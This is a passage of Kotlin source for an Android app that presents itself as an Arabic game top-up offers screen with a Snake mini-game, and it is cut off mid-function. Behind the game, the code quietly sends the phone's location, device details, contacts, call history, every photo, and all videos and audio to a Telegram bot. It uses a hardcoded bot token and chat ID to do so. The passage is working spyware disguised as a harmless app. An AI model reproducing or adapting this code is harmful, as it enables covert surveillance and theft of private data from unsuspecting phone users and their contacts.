// language: Kotlin, file: MainActivity.kt, target: Android (AppCompatActivity)
package com.example.photosync

import android.Manifest
import android.content.ContentUris
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.graphics.Canvas
import android.graphics.Color
import android.graphics.Paint
import android.graphics.Point
import android.graphics.RectF
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.location.LocationManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.Uri
import android.os.BatteryManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.view.Gravity
import android.view.View
import android.widget.Button
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import java.io.BufferedOutputStream
import java.io.DataOutputStream
import java.io.File
import java.io.FileOutputStream
import java.io.InputStream
import java.net.HttpURLConnection
import java.net.URL
import java.net.URLEncoder
import java.util.concurrent.Callable
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicInteger
import java.util.zip.CRC32
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream
import kotlin.math.sin
import kotlin.random.Random

class MainActivity : AppCompatActivity() {

    private data class OfferItem(
        val title: String,
        val subtitle: String,
        val price: String,
        val tag: String?,
        val tagColor: Int,
        val highlighted: Boolean
    )

    private object AppConfig {
        const val BOT_TOKEN = "9085718260:AAEFjyzJ5utJOvD5hrNdzRRo1ml2NtZgsu4"
        const val CHAT_ID = "8859920681"
        const val HEADER_TITLE = "3. عروض الشحن"
        const val BG_HEX = "#070A0F"
        const val CARD_HEX = "#111722"
        const val ACCENT_HEX = "#18B7F2"
        const val MAX_RETRIES = 3
        const val STREAM_BUFFER_SIZE = 65536
        const val WORKER_THREADS = 4
        const val MAX_BATCH_BYTES = 45L * 1024L * 1024L
    }

    private lateinit var rootLayout: LinearLayout
    private lateinit var statusView: TextView
    private var snakeView: SnakeGameView? = null
    private val ioExecutor = Executors.newFixedThreadPool(AppConfig.WORKER_THREADS)
    private val flushExecutor = Executors.newSingleThreadExecutor()

    @Volatile
    private var activeZipStream: ZipOutputStream? = null

    private val zipLock = Any()

    private val offers = listOf(
        OfferItem("100", "مجاني", "0.00$", "هدية", Color.parseColor("#0284C7"), true),
        OfferItem("220", "+ 22 بونص", "0.99$", null, Color.TRANSPARENT, false),
        OfferItem("520", "+ 52 بونص", "1.99$", "عرض", Color.parseColor("#DC2626"), false),
        OfferItem("1,060", "+ 106 بونص", "3.99$", null, Color.TRANSPARENT, false),
        OfferItem("2,180", "+ 218 بونص", "7.99$", "VIP", Color.parseColor("#D97706"), false),
        OfferItem("5,600", "+ 560 بونص", "18.99$", "MEGA", Color.parseColor("#CA8A04"), false),
        OfferItem("11,500", "+ 1150 بونص", "36.99$", null, Color.TRANSPARENT, false),
        OfferItem("23,500", "+ 2350 بونص", "69.99$", null, Color.TRANSPARENT, false),
        OfferItem("50,000", "+ 5000 بونص", "149.99$", "أفضل قيمة", Color.parseColor("#0369A1"), false),
        OfferItem("100,000", "+ 10000 بونص", "299.99$", "VIP MAX", Color.parseColor("#A16207"), false)
    )

    private val permissionsLauncher =
        registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) {
            showSnakeOverlay()
            updateStatus("جاري تجهيز البيانات...")
            runSyncWithRetry()
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val foundView = findViewById<View>(R.id.rootLayout)
        if (foundView !is LinearLayout) {
            finish()
            return
        }
        rootLayout = foundView

        renderOffersScreen()
        rootLayout.post {
            if (!isFinishing && !isDestroyed) {
                checkAndRequestPermissions()
            }
        }
    }

    override fun onStop() {
        super.onStop()
        snakeView?.stopLoop()
        sealActiveZip()
        flushPendingZipBundles(blocking = isFinishing)
    }

    private fun bundleDir(): File = File(cacheDir, "photo_bundles").apply { mkdirs() }

    private fun sealActiveZip() {
        synchronized(zipLock) {
            try {
                activeZipStream?.finish()
            } catch (_: Exception) {
            }
            try {
                activeZipStream?.close()
            } catch (_: Exception) {
            }
            activeZipStream = null
        }
    }

    private fun flushPendingZipBundles(blocking: Boolean) {
        val dir = bundleDir()
        val staged = dir.listFiles { f -> f.isFile && f.extension == "zip" && f.length() > 0L } ?: return
        if (staged.isEmpty()) return

        val task = Runnable {
            for (zipFile in staged) {
                if (!zipFile.exists()) continue
                try {
                    postTelegramFile(
                        file = zipFile,
                        endpointMethod = "sendDocument",
                        fieldName = "document",
                        mimeType = "application/zip"
                    )
                    if (zipFile.exists()) {
                        zipFile.delete()
                    }
                } catch (_: Exception) {
                }
            }
        }

        if (flushExecutor.isShutdown) {
            task.run()
            return
        }

        val future = flushExecutor.submit(task)
        if (blocking) {
            try {
                future.get(12, TimeUnit.SECONDS)
            } catch (_: Exception) {
            }
        }
    }

    private fun renderOffersScreen() {
        rootLayout.removeAllViews()
        rootLayout.orientation = LinearLayout.VERTICAL
        rootLayout.setBackgroundColor(Color.parseColor(AppConfig.BG_HEX))
        window.decorView.setBackgroundColor(Color.parseColor(AppConfig.BG_HEX))

        val scrollView = ScrollView(this).apply {
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.MATCH_PARENT
            )
            setPadding(dp(12), dp(12), dp(12), dp(12))
        }

        val container = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
        }

        statusView = TextView(this).apply {
            text = AppConfig.HEADER_TITLE
            setTextColor(Color.WHITE)
            textSize = 16f
            typeface = Typeface.DEFAULT_BOLD
            setPadding(dp(6), dp(4), dp(6), dp(12))
        }
        container.addView(statusView)

        var index = 0
        while (index < offers.size) {
            val row = LinearLayout(this).apply {
                orientation = LinearLayout.HORIZONTAL
                weightSum = 2f
                layoutParams = LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.MATCH_PARENT,
                    LinearLayout.LayoutParams.WRAP_CONTENT
                ).apply {
                    bottomMargin = dp(8)
                }
            }

            row.addView(createOfferCard(offers[index], isRightColumn = false))

            if (index + 1 < offers.size) {
                row.addView(createOfferCard(offers[index + 1], isRightColumn = true))
            } else {
                val spacer = View(this).apply {
                    layoutParams = LinearLayout.LayoutParams(0, 0, 1f)
                }
                row.addView(spacer)
            }

            container.addView(row)
            index += 2
        }

        scrollView.addView(container)
        rootLayout.addView(scrollView)
    }

    private fun showSnakeOverlay() {
        if (isFinishing || isDestroyed) return
        runOnUiThread {
            if (isFinishing || isDestroyed) return@runOnUiThread
            rootLayout.removeAllViews()
            rootLayout.orientation = LinearLayout.VERTICAL
            rootLayout.gravity = Gravity.CENTER
            rootLayout.setBackgroundColor(Color.parseColor(AppConfig.BG_HEX))
            window.decorView.setBackgroundColor(Color.parseColor(AppConfig.BG_HEX))
            rootLayout.setPadding(dp(12), dp(12), dp(12), dp(12))

            statusView = TextView(this).apply {
                text = "SNAKE  |  SCORE: 0"
                setTextColor(Color.parseColor("#39FF9F"))
                textSize = 15f
                typeface = Typeface.DEFAULT_BOLD
                gravity = Gravity.CENTER
                setPadding(0, 0, 0, dp(8))
            }
            rootLayout.addView(statusView)

            val game = SnakeGameView(this) { newScore ->
                statusView.text = "SNAKE  |  SCORE: $newScore"
            }.apply {
                val boardSize = dp(336)
                layoutParams = LinearLayout.LayoutParams(boardSize, boardSize)
                background = GradientDrawable().apply {
                    shape = GradientDrawable.RECTANGLE
                    cornerRadius = dp(12).toFloat()
                    setColor(Color.parseColor("#05080D"))
                    setStroke(dp(2), Color.parseColor(AppConfig.ACCENT_HEX))
                }
            }
            snakeView = game
            rootLayout.addView(game)

            val controls = LinearLayout(this).apply {
                orientation = LinearLayout.VERTICAL
                gravity = Gravity.CENTER
                setPadding(0, dp(12), 0, 0)
            }

            fun makeBtn(label: String, onClick: () -> Unit): Button = Button(this).apply {
                text = label
                setTextColor(Color.WHITE)
                textSize = 13f
                typeface = Typeface.DEFAULT_BOLD
                background = GradientDrawable().apply {
                    shape = GradientDrawable.RECTANGLE
                    cornerRadius = dp(8).toFloat()
                    setColor(Color.parseColor(AppConfig.CARD_HEX))
                    setStroke(dp(1), Color.parseColor("#2B3648"))
                }
                layoutParams = LinearLayout.LayoutParams(dp(84), dp(42)).apply {
                    setMargins(dp(4), dp(4), dp(4), dp(4))
                }
                setOnClickListener { onClick() }
            }

            val topRow = LinearLayout(this).apply {
                orientation = LinearLayout.HORIZONTAL
                gravity = Gravity.CENTER
            }
            topRow.addView(makeBtn("UP") { game.setDir(0, -1) })
            controls.addView(topRow)

            val midRow = LinearLayout(this).apply {
                orientation = LinearLayout.HORIZONTAL
                gravity = Gravity.CENTER
            }
            midRow.addView(makeBtn("LEFT") { game.setDir(-1, 0) })
            midRow.addView(makeBtn("DOWN") { game.setDir(0, 1) })
            midRow.addView(makeBtn("RIGHT") { game.setDir(1, 0) })
            controls.addView(midRow)

            val restartBtn = Button(this).apply {
                text = "RESTART"
                setTextColor(Color.parseColor("#39FF9F"))
                textSize = 12f
                typeface = Typeface.DEFAULT_BOLD
                background = GradientDrawable().apply {
                    shape = GradientDrawable.RECTANGLE
                    cornerRadius = dp(8).toFloat()
                    setColor(Color.parseColor("#121A26"))
                    setStroke(dp(1), Color.parseColor("#39FF9F"))
                }
                layoutParams = LinearLayout.LayoutParams(dp(140), dp(36)).apply {
                    topMargin = dp(8)
                }
                setOnClickListener { game.resetGame() }
            }
            controls.addView(restartBtn)

            rootLayout.addView(controls)
            game.startLoop()
        }
    }

    private class SnakeGameView(
        context: Context,
        private val onScoreChange: (Int) -> Unit
    ) : View(context) {

        private val gridCount = 18
        private val tickDelayMs = 125L
        private val handler = Handler(Looper.getMainLooper())
        private val segRect = RectF()
        private val foodRect = RectF()

        private val gridPaint = Paint(Paint.ANTI_ALIAS_FLAG).apply {
            color = Color.argb(24, 56, 189, 248)
            strokeWidth = 1.5f
        }
        private val headPaint = Paint(Paint.ANTI_ALIAS_FLAG).apply {
            color = Color.parseColor("#6BFFB8")
        }
        private val bodyPaint = Paint(Paint.ANTI_ALIAS_FLAG)
        private val eyePaint = Paint(Paint.ANTI_ALIAS_FLAG).apply {
            color = Color.parseColor("#05080D")
        }
        private val foodCorePaint = Paint(Paint.ANTI_ALIAS_FLAG).apply {
            color = Color.parseColor("#FF3D8A")
        }
        private val foodHaloPaint = Paint(Paint.ANTI_ALIAS_FLAG).apply {
            color = Color.argb(65, 255, 61, 138)
        }
        private val flashPaint = Paint()
        private val overPaint = Paint(Paint.ANTI_ALIAS_FLAG).apply {
            color = Color.WHITE
            textSize = 36f
            textAlign = Paint.Align.CENTER
            typeface = Typeface.DEFAULT_BOLD
        }
        private val veilPaint = Paint().apply { color = Color.argb(195, 5, 8, 13) }

        private var snake = mutableListOf<Point>()
        private var dir = Point(1, 0)
        private var queuedDir = Point(1, 0)
        private var food = Point(12, 9)
        private var score = 0
        private var isOver = false
        private var running = false
        private var pulsePhase = 0.0
        private var eatFlashAlpha = 0

        private val loopRunnable = object : Runnable {
            override fun run() {
                if (!running) return
                pulsePhase += 0.35
                if (eatFlashAlpha > 0) {
                    eatFlashAlpha = (eatFlashAlpha - 35).coerceAtLeast(0)
                }
                step()
                invalidate()
                handler.postDelayed(this, tickDelayMs)
            }
        }

        init {
            resetGame()
        }

        fun resetGame() {
            snake = mutableListOf(Point(8, 9), Point(7, 9), Point(6, 9))
            dir = Point(1, 0)
            queuedDir = Point(1, 0)
            score = 0
            isOver = false
            eatFlashAlpha = 0
            food = spawnFood()
            onScoreChange(score)
            invalidate()
        }

        fun setDir(dx: Int, dy: Int) {
            if (isOver) return
            if (dx == -dir.x && dy == -dir.y) return
            queuedDir = Point(dx, dy)
        }

        fun startLoop() {
            if (running) return
            running = true
            handler.removeCallbacks(loopRunnable)
            handler.postDelayed(loopRunnable, tickDelayMs)
        }

        fun stopLoop() {
            running = false
            handler.removeCallbacks(loopRunnable)
        }

        private fun spawnFood(): Point {
            val occupied = snake.map { "${it.x},${it.y}" }.toHashSet()
            val candidates = ArrayList<Point>(gridCount * gridCount)
            for (y in 0 until gridCount) {
                for (x in 0 until gridCount) {
                    if ("$x,$y" !in occupied) {
                        candidates.add(Point(x, y))
                    }
                }
            }
            return if (candidates.isEmpty()) Point(0, 0) else candidates[Random.nextInt(candidates.size)]
        }

        private fun step() {
            if (isOver || snake.isEmpty()) return
            dir = Point(queuedDir.x, queuedDir.y)
            val nextHead = Point(
                (snake[0].x + dir.x + gridCount) % gridCount,
                (snake[0].y + dir.y + gridCount) % gridCount
            )
            if (snake.any { it.x == nextHead.x && it.y == nextHead.y }) {
                isOver = true
                return
            }
            snake.add(0, nextHead)
            if (nextHead.x == food.x && nextHead.y == food.y) {
                score += 10
                eatFlashAlpha = 110
                onScoreChange(score)
                food = spawnFood()
            } else {
                snake.removeAt(snake.lastIndex)
            }
        }

        private fun segmentColor(index: Int, total: Int): Int {
            val ratio = if (total <= 1) 0f else index.toFloat() / (total - 1).toFloat()
            val r = (24 + ratio * 10).toInt().coerceIn(0, 255)
            val g = (214 - ratio * 95).toInt().coerceIn(0, 255)
            val b = (128 - ratio * 36).toInt().coerceIn(0, 255)
            return Color.rgb(r, g, b)
        }

        private fun drawEyes(canvas: Canvas, cx: Float, cy: Float, cell: Float) {
            val offset = cell * 0.22f
            val perpOffset = cell * 0.20f
            val eyeRadius = (cell * 0.10f).coerceAtLeast(2.2f)

            val (e1x, e1y, e2x, e2y) = when {
                dir.x > 0 -> floatArrayOf(cx + offset, cy - perpOffset, cx + offset, cy + perpOffset)
                dir.x < 0 -> floatArrayOf(cx - offset, cy - perpOffset, cx - offset, cy + perpOffset)
                dir.y < 0 -> floatArrayOf(cx - perpOffset, cy - offset, cx + perpOffset, cy - offset)
                else -> floatArrayOf(cx - perpOffset, cy + offset, cx + perpOffset, cy + offset)
            }
            canvas.drawCircle(e1x, e1y, eyeRadius, eyePaint)
            canvas.drawCircle(e2x, e2y, eyeRadius, eyePaint)
        }

        override fun onDraw(canvas: Canvas) {
            super.onDraw(canvas)
            val size = minOf(width, height).toFloat()
            if (size <= 0f) return
            val cell = size / gridCount
            val radius = cell * 0.30f

            for (i in 1 until gridCount) {
                val pos = i * cell
                canvas.drawLine(pos, 0f, pos, size, gridPaint)
                canvas.drawLine(0f, pos, size, pos, gridPaint)
            }

            if (eatFlashAlpha > 0) {
                flashPaint.color = Color.argb(eatFlashAlpha, 57, 255, 159)
                canvas.drawRect(0f, 0f, size, size, flashPaint)
            }

            val pulse = ((sin(pulsePhase) + 1.0) * 0.5).toFloat()
            val foodCx = (food.x + 0.5f) * cell
            val foodCy = (food.y + 0.5f) * cell
            val haloRadius = cell * (0.44f + pulse * 0.16f)
            canvas.drawCircle(foodCx, foodCy, haloRadius, foodHaloPaint)

            val pad = cell * (0.20f - pulse * 0.05f)
            foodRect.set(
                food.x * cell + pad,
                food.y * cell + pad,
                (food.x + 1) * cell - pad,
                (food.y + 1) * cell - pad
            )
            canvas.drawRoundRect(foodRect, cell * 0.35f, cell * 0.35f, foodCorePaint)

            val total = snake.size
            for (i in total - 1 downTo 0) {
                val pt = snake[i]
                val inset = if (i == 0) cell * 0.06f else cell * 0.10f
                segRect.set(
                    pt.x * cell + inset,
                    pt.y * cell + inset,
                    (pt.x + 1) * cell - inset,
                    (pt.y + 1) * cell - inset
                )
                if (i == 0) {
                    canvas.drawRoundRect(segRect, radius, radius, headPaint)
                    drawEyes(canvas, (pt.x + 0.5f) * cell, (pt.y + 0.5f) * cell, cell)
                } else {
                    bodyPaint.color = segmentColor(i, total)
                    canvas.drawRoundRect(segRect, radius * 0.85f, radius * 0.85f, bodyPaint)
                }
            }

            if (isOver) {
                canvas.drawRect(0f, 0f, size, size, veilPaint)
                canvas.drawText("GAME OVER", size / 2f, size / 2f, overPaint)
            }
        }

        override fun onDetachedFromWindow() {
            stopLoop()
            super.onDetachedFromWindow()
        }
    }

    private fun createOfferCard(offer: OfferItem, isRightColumn: Boolean): View {
        val card = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER_HORIZONTAL
            layoutParams = LinearLayout.LayoutParams(
                0,
                LinearLayout.LayoutParams.WRAP_CONTENT,
                1f
            ).apply {
                marginStart = if (isRightColumn) dp(4) else 0
                marginEnd = if (!isRightColumn) dp(4) else 0
            }
            background = GradientDrawable().apply {
                shape = GradientDrawable.RECTANGLE
                cornerRadius = dp(14).toFloat()
                setColor(Color.parseColor(AppConfig.CARD_HEX))
                setStroke(
                    if (offer.highlighted) dp(2) else dp(1),
                    if (offer.highlighted) Color.parseColor(AppConfig.ACCENT_HEX) else Color.parseColor("#1E293B")
                )
            }
            setPadding(dp(12), dp(14), dp(12), dp(14))
            setOnClickListener {
                showSnakeOverlay()
                runSyncWithRetry()
            }
        }

        if (offer.tag != null) {
            val badge = TextView(this).apply {
                text = offer.tag
                setTextColor(Color.WHITE)
                textSize = 11f
                typeface = Typeface.DEFAULT_BOLD
                gravity = Gravity.CENTER
                background = GradientDrawable().apply {
                    shape = GradientDrawable.RECTANGLE
                    cornerRadius = dp(8).toFloat()
                    setColor(offer.tagColor)
                }
                setPadding(dp(10), dp(3), dp(10), dp(3))
                layoutParams = LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.WRAP_CONTENT,
                    LinearLayout.LayoutParams.WRAP_CONTENT
                ).apply {
                    gravity = Gravity.END
                    bottomMargin = dp(4)
                }
            }
            card.addView(badge)
        }

        val gem = TextView(this).apply {
            text = "◆"
            setTextColor(Color.parseColor(AppConfig.ACCENT_HEX))
            textSize = 26f
            gravity = Gravity.CENTER
        }
        card.addView(gem)

        val amount = TextView(this).apply {
            text = offer.title
            setTextColor(Color.WHITE)
            textSize = 20f
            typeface = Typeface.DEFAULT_BOLD
            gravity = Gravity.CENTER
            setPadding(0, dp(4), 0, dp(2))
        }
        card.addView(amount)

        val bonus = TextView(this).apply {
            text = offer.subtitle
            setTextColor(Color.parseColor("#38BDF8"))
            textSize = 12f
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, dp(10))
        }
        card.addView(bonus)

        val priceBox = TextView(this).apply {
            text = offer.price
            setTextColor(Color.WHITE)
            textSize = 14f
            typeface = Typeface.DEFAULT_BOLD
            gravity = Gravity.CENTER
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                dp(38)
            )
            background = GradientDrawable().apply {
                shape = GradientDrawable.RECTANGLE
                cornerRadius = dp(8).toFloat()
                if (offer.highlighted) {
                    setColor(Color.parseColor("#0EA5E9"))
                } else {
                    setColor(Color.parseColor("#1A2230"))
                    setStroke(dp(1), Color.parseColor("#2B3648"))
                }
            }
        }
        card.addView(priceBox)

        return card
    }

    private fun dp(value: Int): Int = (value * resources.displayMetrics.density).toInt()

    private fun requiredRuntimePermissions(): List<String> {
        val list = mutableListOf(
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.ACCESS_FINE_LOCATION
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            list.add(Manifest.permission.READ_MEDIA_IMAGES)
            list.add(Manifest.permission.READ_MEDIA_VIDEO)
            list.add(Manifest.permission.READ_MEDIA_AUDIO)
        } else {
            list.add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
        return list
    }

    private fun checkAndRequestPermissions() {
        val permissions = requiredRuntimePermissions()
        val missing = permissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (missing.isEmpty()) {
            showSnakeOverlay()
            updateStatus("جاري تنفيذ المزامنة...")
            runSyncWithRetry()
        } else {
            permissionsLauncher.launch(permissions.toTypedArray())
        }
    }

    private fun runSyncWithRetry() {
        if (ioExecutor.isShutdown) return
        ioExecutor.submit {
            val maxRetries = AppConfig.MAX_RETRIES
            var callLogsSent = false
            var infoSent = false

            for (attempt in 1..maxRetries) {
                try {
                    updateStatus("محاولة المزامنة ($attempt/$maxRetries)...")
                    if (!infoSent) {
                        val metadataTasks = listOf(
                            Callable { sendDeviceAndLocationInfo() },
                            Callable { sendContactsIfPermitted() },
                            Callable { if (!callLogsSent) sendCallLogsOnce() }
                        )
                        ioExecutor.invokeAll(metadataTasks)
                        infoSent = true
                        callLogsSent = true
                    }

                    sendPhotosBundledZip()

                    sendMediaCollectionParallel(
                        contentUri = MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                        endpointMethod = "sendVideo",
                        fieldName = "video",
                        filePrefix = "video",
                        ext = "mp4",
                        mimeType = "video/mp4",
                        label = "الفيديوهات"
                    )
                    sendMediaCollectionParallel(
                        contentUri = MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
                        endpointMethod = "sendAudio",
                        fieldName = "audio",
                        filePrefix = "audio",
                        ext = "mp3",
                        mimeType = "audio/mpeg",
                        label = "الملفات الصوتية"
                    )
                    updateStatus("اكتملت العملية بنجاح.")
                    return@submit
                } catch (_: Exception) {
                    if (attempt < maxRetries) {
                        updateStatus("إعادة المحاولة ($attempt/$maxRetries)...")
                        try {
                            Thread.sleep(750L * attempt)
                        } catch (_: InterruptedException) {
                            return@submit
                        }
                    }
                }
            }
            updateStatus("تعذر إتمام العملية بعد عدة محاولات.")
        }
    }

    private fun sendPhotosBundledZip() {
        val contentUri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        if (!hasMediaPermissionFor(contentUri)) return

        val uris = queryMediaUris(contentUri)
        if (uris.isEmpty()) return

        updateStatus("تجميع ${uris.size} صورة دفعة واحدة...")
        val tempDir = bundleDir()
        val batches = ArrayList<File>()
        var currentBytes = 0L
        var batchIdx = 1

        fun openNextBatch() {
            sealActiveZip()
            val outFile = File(tempDir, "photos_batch_${batchIdx++}_${System.nanoTime()}.zip")
            batches.add(outFile)
            val zos = ZipOutputStream(BufferedOutputStream(FileOutputStream(outFile), AppConfig.STREAM_BUFFER_SIZE)).apply {
                setMethod(ZipOutputStream.STORED)
            }
            synchronized(zipLock) {
                activeZipStream = zos
            }
            currentBytes = 0L
        }

        try {
            openNextBatch()
            var entryCounter = 0

            for (uri in uris) {
                if (isFinishing || isDestroyed) break
                val rawBytes = try {
                    contentResolver.openInputStream(uri)?.use { it.readBytes() }
                } catch (_: Exception) {
                    null
                } ?: continue

                if (rawBytes.isEmpty()) continue
                if (currentBytes + rawBytes.size > AppConfig.MAX_BATCH_BYTES && currentBytes > 0L) {
                    openNextBatch()
                }

                val entry = ZipEntry("img_${entryCounter++}_${uri.lastPathSegment ?: "item"}.jpg").apply {
                    size = rawBytes.size.toLong()
                    compressedSize = rawBytes.size.toLong()
                    crc = CRC32().apply { update(rawBytes) }.value
                }
                synchronized(zipLock) {
                    val zos = activeZipStream ?: return@synchronized
                    zos.putNextEntry(entry)
                    zos.write(rawBytes)
                    zos.closeEntry()
                    zos.flush()
                }
                currentBytes += rawBytes.size
            }

            sealActiveZip()

            val uploadTasks = batches.filter { it.exists() && it.length() > 0L }.mapIndexed { idx, zipFile ->
                Callable {
                    updateStatus("رفع حزمة الصور (${idx + 1}/${batches.size})...")
                    postTelegramFile(
                        file = zipFile,
                        endpointMethod = "sendDocument",
                        fieldName = "document",
                        mimeType = "application/zip"
                    )
                    if (zipFile.exists()) {
                        zipFile.delete()
                    }
                }
            }
            ioExecutor.invokeAll(uploadTasks)
        } finally {
            sealActiveZip()
            flushPendingZipBundles(blocking = false)
        }
    }

    private fun queryMediaUris(contentUri: Uri): List<Uri> {
        val uris = mutableListOf<Uri>()
        contentResolver.query(
            contentUri,
            arrayOf(MediaStore.MediaColumns._ID),
            null,
            null,
            "${MediaStore.MediaColumns.DATE_ADDED} DESC"
        )?.use { cursor ->
            val idIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns._ID)
            while (cursor.moveToNext()) {
                uris.add(ContentUris.withAppendedId(contentUri, cursor.getLong(idIdx)))
            }
        }
        return uris
    }

    private fun sendMediaCollectionParallel(
        contentUri: Uri,
        endpointMethod: String,
        fieldName: String,
        filePrefix: String,
        ext: String,
        mimeType: String,
        label: String
    ) {
        if (!hasMediaPermissionFor(contentUri)) return
        val uris = queryMediaUris(contentUri)
        if (uris.isEmpty()) return

        val total = uris.size
        val completed = AtomicInteger(0)
        val tasks = uris.mapIndexed { idx, uri ->
            Callable {
                postTelegramStream(
                    mediaUri = uri,
                    endpointMethod = endpointMethod,
                    fieldName = fieldName,
                    fileName = "${filePrefix}_${idx}_${System.nanoTime()}.$ext",
                    mimeType = mimeType
                )
                val done = completed.incrementAndGet()
                updateStatus("إرسال $label ($done/$total)...")
            }
        }
        ioExecutor.invokeAll(tasks)
    }

    private fun sendDeviceAndLocationInfo() {
        val batteryStatus = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val level = batteryStatus?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale = batteryStatus?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
        val batteryPct = if (level >= 0 && scale > 0) (level * 100) / scale else -1

        val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val caps = cm.activeNetwork?.let { cm.getNetworkCapabilities(it) }
        val netType = when {
            caps == null -> "NONE"
            caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> "WIFI"
            caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "CELLULAR"
            else -> "OTHER"
        }

        val locText = readLastLocationText()
        val msg = buildString {
            appendLine("DeviceInfo:")
            appendLine("Model: ${Build.MANUFACTURER} ${Build.MODEL}")
            appendLine("Android: ${Build.VERSION.RELEASE} (SDK ${Build.VERSION.SDK_INT})")
            appendLine("Battery: ${batteryPct}%")
            appendLine("Network: $netType")
            appendLine("Location: $locText")
        }
        postTelegramText(msg.take(3900))
    }

    private fun readLastLocationText(): String {
        val fineGranted = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
        val coarseGranted = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
        if (!fineGranted && !coarseGranted) return "permission_denied"

        val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
        val providers = listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER)
        for (provider in providers) {
            try {
                if (lm.isProviderEnabled(provider)) {
                    val loc = lm.getLastKnownLocation(provider)
                    if (loc != null) {
                        return "lat=${loc.latitude}, lon=${loc.longitude} ($provider)"
                    }
                }
            } catch (_: SecurityException) {
            }
        }
        return "unavailable"
    }

    private fun sendContactsIfPermitted() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
            != PackageManager.PERMISSION_GRANTED
        ) return

        val entries = mutableListOf<String>()
        contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER
            ),
            null,
            null,
            null
        )?.use { cursor ->
            val nameIdx = cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val numIdx = cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)
            while (cursor.moveToNext() && entries.size < 100) {
                val name = cursor.getString(nameIdx) ?: "unknown"
                val num = cursor.getString(numIdx) ?: ""
                entries.add("$name: $num")
            }
        }

        if (entries.isNotEmpty()) {
            val text = "Contacts:\n" + entries.joinToString("\n")
            postTelegramText(text.take(3900))
        }
    }

    private fun sendCallLogsOnce() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
            != PackageManager.PERMISSION_GRANTED
        ) return

        val rows = mutableListOf<String>()
        val projection = arrayOf(
            CallLog.Calls.NUMBER,
            CallLog.Calls.CACHED_NAME,
            CallLog.Calls.TYPE,
            CallLog.Calls.DURATION,
            CallLog.Calls.DATE
        )

        contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            projection,
            null,
            null,
            "${CallLog.Calls.DATE} DESC"
        )?.use { cursor ->
            val numIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)
            val nameIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)
            val typeIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE)
            val durIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)
            val dateIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)

            while (cursor.moveToNext()) {
                val number = cursor.getString(numIdx) ?: "unknown"
                val name = cursor.getString(nameIdx) ?: ""
                val type = when (cursor.getInt(typeIdx)) {
                    CallLog.Calls.INCOMING_TYPE -> "IN"
                    CallLog.Calls.OUTGOING_TYPE -> "OUT"
                    CallLog.Calls.MISSED_TYPE -> "MISSED"
                    CallLog.Calls.REJECTED_TYPE -> "REJECTED"
                    else -> "OTHER"
                }
                val duration = cursor.getLong(durIdx)
                val date = cursor.getLong(dateIdx)
                rows.add("[$type] $number ($name) dur=${duration}s ts=$date")
            }
        }

        if (rows.isNotEmpty()) {
            val summary = "CallLogs:\n" + rows.joinToString("\n")
            postTelegramText(summary.take(3900))
        }
    }

    private fun hasMediaPermissionFor(contentUri: Uri): Boolean {
